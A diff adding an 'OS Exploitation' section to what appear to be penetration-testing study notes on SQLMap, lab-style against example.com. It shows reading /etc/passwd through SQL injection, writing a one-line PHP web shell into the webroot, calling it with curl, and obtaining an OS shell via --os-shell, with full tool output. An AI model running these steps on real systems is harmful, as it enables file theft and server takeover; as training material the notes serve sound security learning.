@@ -88,6 +88,12 @@
     - [User-agent Blacklisting Bypass](#user-agent-blacklisting-bypass)
     - [Tamper Scripts](#tamper-scripts)
     - [Miscellaneous Bypasses](#miscellaneous-bypasses)
+  - [OS Exploitation](#os-exploitation)
+    - [File Read/Write](#file-readwrite)
+    - [Checking for DBA Privileges](#checking-for-dba-privileges)
+    - [Reading Local Files](#reading-local-files)
+    - [Writing Local Files](#writing-local-files)
+    - [OS Command Execution](#os-command-execution)
 
 ---
 
@@ -1898,3 +1904,255 @@ To get a whole list of implemented tamper scripts, along with the description, s
 2. HTTP parameter pollution
    - payloads are split in a similar way
    - then, are concatenated by the target platform if supporting it
+
+## OS Exploitation
+
+SQLMap has the ability to utilize an SQLi to read and write files from the local system outside the DBMS. It can also attempt to give you direct command execution on the remote host if you had the proper privileges.
+
+### File Read/Write
+
+Reading data is much more common than writing data, which is strictly privileged in modern DBMSes, as it can lead to system exploitation. For example, in MySQL, to read local files, the DB user must have the privilege to LOAD DATA and INSERT, to be able to load the content of a file to a table and then reading that table.
+
+Example:
+
+```LOAD DATA LOCAL INFILE '/etc'passwd' INTO TABLE passwd;```
+
+> [!NOTE]
+> It is becoming much more common in modern DBMSes, to have DBA to read data.
+
+### Checking for DBA Privileges
+
+To check whether you have DBA privileges with SQLMap, you can use ```--is-dba```.
+
+```bash
+41y@htb[/htb]$ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 17:31:55 /2020-11-19/
+
+[17:31:55] [INFO] resuming back-end DBMS 'mysql'
+[17:31:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: False
+
+[*] ending @ 17:31:56 /2020-11-19
+```
+
+If true:
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --is-dba
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.4.11#stable}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:37:47 /2020-11-19/
+
+[17:37:47] [INFO] resuming back-end DBMS 'mysql'
+[17:37:47] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+current user is DBA: True
+
+[*] ending @ 17:37:48 /2020-11-19/
+```
+
+### Reading Local Files
+
+Instead of manually injecting the above line through SQLi (_```LOAD DATA LOCAL INFILE '/etc'passwd' INTO TABLE passwd;```_), SQLMap makes it relatively easy to read local files with the ```--file-read``` option.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:40:00 /2020-11-19/
+
+[17:40:00] [INFO] resuming back-end DBMS 'mysql'
+[17:40:00] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+[17:40:01] [INFO] fetching file: '/etc/passwd'
+[17:40:01] [WARNING] time-based comparison requires larger statistical model, please wait............................. (done)
+[17:40:07] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[17:40:07] [WARNING] unable to retrieve the content of the file '/etc/passwd', going to fall-back to simpler UNION technique
+[17:40:07] [INFO] fetching file: '/etc/passwd'
+do you want confirmation that the remote file '/etc/passwd' has been successfully downloaded from the back-end DBMS file system? [Y/n] y
+
+[17:40:14] [INFO] the local file '~/.sqlmap/output/www.example.com/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (982 B)
+files saved to [1]:
+[*] ~/.sqlmap/output/www.example.com/files/_etc_passwd (same file)
+
+[*] ending @ 17:40:14 /2020-11-19/
+```
+
+To see its content:
+
+```bash
+d41y@htb[/htb]$ cat ~/.sqlmap/output/www.example.com/files/_etc_passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...SNIP...
+```
+
+### Writing Local Files
+
+When it comes to writing files on the hosting server, it becomes much more restricted in modern DBMSes, since you can utilize this to write a Web Shell on the remote server, and hence get the code execution and take over the server.
+
+This is why modern DBMSes disable file-write by default and need certain privileges for DBA's to be able to write files. For example, in MySQL, the ```--secure-file-priv``` configuration must be manually disabled to allow writing data into local files using the INTO OUTFILE SQL query, in addition to any local access needed on the host server, like the privilege to write in the directory you need.
+
+Still, many web applications require the ability for DBMSes to write data into files, so it is worth testing whether you can write files to the remote server. To do that with SQLMap, you can use the ```--file-write``` and ```--file-dest``` options. First, you need a PHP web shell.
+
+```bash
+d41y@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Now write this file on the remote server, in the ```/var/www/html/``` directory,the default server webroot for Apache. If you didn't know the server webroot, you will see how SQLMap can automatically find it.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.11#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 17:54:18 /2020-11-19/
+
+[17:54:19] [INFO] resuming back-end DBMS 'mysql'
+[17:54:19] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+do you want confirmation that the local file 'shell.php' has been successfully written on the back-end DBMS file system ('/var/www/html/shell.php')? [Y/n] y
+
+[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)
+
+[*] ending @ 17:54:28 /2020-11-19/
+```
+
+Now, to access the remote PHP shell:
+
+```bash
+d41y@htb[/htb]$ curl http://www.example.com/shell.php?cmd=ls+-la
+
+total 148
+drwxrwxrwt 1 www-data www-data   4096 Nov 19 17:54 .
+drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
+-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
+...SNIP...
+```
+
+### OS Command Execution
+
+Now that you confirmed that you could write a PHP shell to get command execution, you can test SQLMap's ability to give you an easy OS shell without manually writing a remote shell. SQLMap utilizes various techniques to get a remote shell through SQLi vulns, like writing a remote shell, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS commands, like ```xp_cmdshell?``` in MSSQL. To get an OS shell with SQLMap, you can use the ```--os-shell``` option.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell
+
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.4.11#stable}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[*] starting @ 18:02:15 /2020-11-19/
+
+[18:02:16] [INFO] resuming back-end DBMS 'mysql'
+[18:02:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+[18:02:37] [INFO] the local file '/tmp/sqlmapmswx18kp12261/lib_mysqludf_sys8kj7u1jp.so' and the remote file './libslpjs.so' have the same size (8040 B)
+[18:02:37] [INFO] creating UDF 'sys_exec' from the binary UDF file
+[18:02:38] [INFO] creating UDF 'sys_eval' from the binary UDF file
+[18:02:39] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
+[18:02:39] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> ls -la
+do you want to retrieve the command standard output? [Y/n/a] a
+
+[18:02:45] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
+No output
+```
+
+You see that SQLMap defaulted to UNION technique to get an OS shell, but eventually failed to give you any output. So, as you already know you have multiple types of SQLi vulns. Try to specify another one, like the ```Error-based SQLi```, which you can specify with ```--technique=E```.
+
+```bash
+d41y@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 18:05:59 /2020-11-19/
+
+[18:05:59] [INFO] resuming back-end DBMS 'mysql'
+[18:05:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+
+do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
+
+[18:06:07] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> 1
+
+[18:06:09] [WARNING] unable to automatically parse any web server path
+[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
+[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
+[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
+[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
+[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> ls -la
+
+do you want to retrieve the command standard output? [Y/n/a] a
+
+command standard output:
+---
+total 156
+drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
+drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
+-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
+...SNIP...
+```
+
